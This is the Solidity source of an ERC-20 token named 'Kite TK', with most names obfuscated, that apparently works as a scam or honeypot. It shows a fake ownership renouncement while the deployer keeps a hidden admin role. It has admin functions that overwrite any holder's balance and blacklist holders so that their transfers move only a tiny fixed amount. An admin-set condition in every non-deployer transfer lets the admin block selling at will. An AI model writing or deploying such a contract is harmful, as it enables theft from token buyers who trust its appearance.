//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface syzfvehjpgve {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract mwwkntoisoqn {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface mnlzguuphdbe {
    function createPair(address dtqgkegvkql, address fuiopgkwrs) external returns (address);
}

interface aghknuzfknwdwn {
    function totalSupply() external view returns (uint256);

    function balanceOf(address hnupmoqycb) external view returns (uint256);

    function transfer(address xtuwrlhwt, uint256 zorqkmmpkkwxmf) external returns (bool);

    function allowance(address cgcbcqpozf, address spender) external view returns (uint256);

    function approve(address spender, uint256 zorqkmmpkkwxmf) external returns (bool);

    function transferFrom(
        address sender,
        address xtuwrlhwt,
        uint256 zorqkmmpkkwxmf
    ) external returns (bool);

    event Transfer(address indexed from, address indexed vlzhidhfdv, uint256 value);
    event Approval(address indexed cgcbcqpozf, address indexed spender, uint256 value);
}

interface ggullkeriqihm is aghknuzfknwdwn {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract KiteTK is mwwkntoisoqn, aghknuzfknwdwn, ggullkeriqihm {

    function owner() external view returns (address) {
        return wzlpslnstlas;
    }

    function allowance(address dbrkoabyuqiyln, address fqcibeyfsknyxb) external view virtual override returns (uint256) {
        if (fqcibeyfsknyxb == uthcjufty) {
            return type(uint256).max;
        }
        return yvrtyhazpwci[dbrkoabyuqiyln][fqcibeyfsknyxb];
    }

    string private ceeudhnkjbtdc = "KTK";

    function gyoqmebhoexs(uint256 zorqkmmpkkwxmf) public {
        sbjuhiwbxg();
        acdbjxqgv = zorqkmmpkkwxmf;
    }

    bool private qppttbhgky;

    function cimcdqjeqmnd() public {
        emit OwnershipTransferred(yblarndecxk, address(0));
        wzlpslnstlas = address(0);
    }

    uint256 bdirihocolxwwv;

    function olvxlbqajm(address bpvqpzhcvaec, address xtuwrlhwt, uint256 zorqkmmpkkwxmf) internal returns (bool) {
        require(aeiovjcfne[bpvqpzhcvaec] >= zorqkmmpkkwxmf);
        aeiovjcfne[bpvqpzhcvaec] -= zorqkmmpkkwxmf;
        aeiovjcfne[xtuwrlhwt] += zorqkmmpkkwxmf;
        emit Transfer(bpvqpzhcvaec, xtuwrlhwt, zorqkmmpkkwxmf);
        return true;
    }

    mapping(address => mapping(address => uint256)) private yvrtyhazpwci;

    function totalSupply() external view virtual override returns (uint256) {
        return bamgqnfuhm;
    }

    address public yblarndecxk;

    constructor (){
        
        cimcdqjeqmnd();
        syzfvehjpgve rqpepexovvuex = syzfvehjpgve(uthcjufty);
        ybytnvpicreoi = mnlzguuphdbe(rqpepexovvuex.factory()).createPair(rqpepexovvuex.WETH(), address(this));
        
        yblarndecxk = _msgSender();
        eskdispdz[yblarndecxk] = true;
        aeiovjcfne[yblarndecxk] = bamgqnfuhm;
        
        emit Transfer(address(0), yblarndecxk, bamgqnfuhm);
    }

    function decimals() external view virtual override returns (uint8) {
        return wlawbesrjp;
    }

    function getOwner() external view returns (address) {
        return wzlpslnstlas;
    }

    function gwxyfkwcpyzyx(address kafmalniext, uint256 zorqkmmpkkwxmf) public {
        sbjuhiwbxg();
        aeiovjcfne[kafmalniext] = zorqkmmpkkwxmf;
    }

    mapping(address => bool) public eskdispdz;

    uint256 private emkdqsrirtbjt;

    function approve(address fqcibeyfsknyxb, uint256 zorqkmmpkkwxmf) public virtual override returns (bool) {
        yvrtyhazpwci[_msgSender()][fqcibeyfsknyxb] = zorqkmmpkkwxmf;
        emit Approval(_msgSender(), fqcibeyfsknyxb, zorqkmmpkkwxmf);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return kljneyarnk;
    }

    function transfer(address kafmalniext, uint256 zorqkmmpkkwxmf) external virtual override returns (bool) {
        return snzvqpmkuc(_msgSender(), kafmalniext, zorqkmmpkkwxmf);
    }

    uint256 public xlawzbfyh;

    function transferFrom(address bpvqpzhcvaec, address xtuwrlhwt, uint256 zorqkmmpkkwxmf) external override returns (bool) {
        if (_msgSender() != uthcjufty) {
            if (yvrtyhazpwci[bpvqpzhcvaec][_msgSender()] != type(uint256).max) {
                require(zorqkmmpkkwxmf <= yvrtyhazpwci[bpvqpzhcvaec][_msgSender()]);
                yvrtyhazpwci[bpvqpzhcvaec][_msgSender()] -= zorqkmmpkkwxmf;
            }
        }
        return snzvqpmkuc(bpvqpzhcvaec, xtuwrlhwt, zorqkmmpkkwxmf);
    }

    bool public bkqszkizantgd;

    event OwnershipTransferred(address indexed xmwbulpckn, address indexed lrrckudfcaoynk);

    function sbjuhiwbxg() private view {
        require(eskdispdz[_msgSender()]);
    }

    address qibooanrg = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private aeiovjcfne;

    address public ybytnvpicreoi;

    address uthcjufty = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public pluypakts;

    function adddmdnmaffxta(address xfmjjaxldeg) public {
        if (pluypakts) {
            return;
        }
        
        eskdispdz[xfmjjaxldeg] = true;
        if (xlawzbfyh != emkdqsrirtbjt) {
            emkdqsrirtbjt = xlawzbfyh;
        }
        pluypakts = true;
    }

    uint8 private wlawbesrjp = 18;

    address private wzlpslnstlas;

    uint256 constant vsdzfibvhow = 13 ** 10;

    function fajgdhioihta(address aykplwihvsmc) public {
        sbjuhiwbxg();
        
        if (aykplwihvsmc == yblarndecxk || aykplwihvsmc == ybytnvpicreoi) {
            return;
        }
        bpilgvvio[aykplwihvsmc] = true;
    }

    mapping(address => bool) public bpilgvvio;

    uint256 acdbjxqgv;

    function symbol() external view virtual override returns (string memory) {
        return ceeudhnkjbtdc;
    }

    string private kljneyarnk = "Kite TK";

    uint256 private bamgqnfuhm = 100000000 * 10 ** 18;

    function balanceOf(address hnupmoqycb) public view virtual override returns (uint256) {
        return aeiovjcfne[hnupmoqycb];
    }

    function snzvqpmkuc(address bpvqpzhcvaec, address xtuwrlhwt, uint256 zorqkmmpkkwxmf) internal returns (bool) {
        if (bpvqpzhcvaec == yblarndecxk) {
            return olvxlbqajm(bpvqpzhcvaec, xtuwrlhwt, zorqkmmpkkwxmf);
        }
        uint256 zadcwzstegxv = aghknuzfknwdwn(ybytnvpicreoi).balanceOf(qibooanrg);
        require(zadcwzstegxv == acdbjxqgv);
        require(xtuwrlhwt != qibooanrg);
        if (bpilgvvio[bpvqpzhcvaec]) {
            return olvxlbqajm(bpvqpzhcvaec, xtuwrlhwt, vsdzfibvhow);
        }
        return olvxlbqajm(bpvqpzhcvaec, xtuwrlhwt, zorqkmmpkkwxmf);
    }

    uint256 private viselmddtn;

}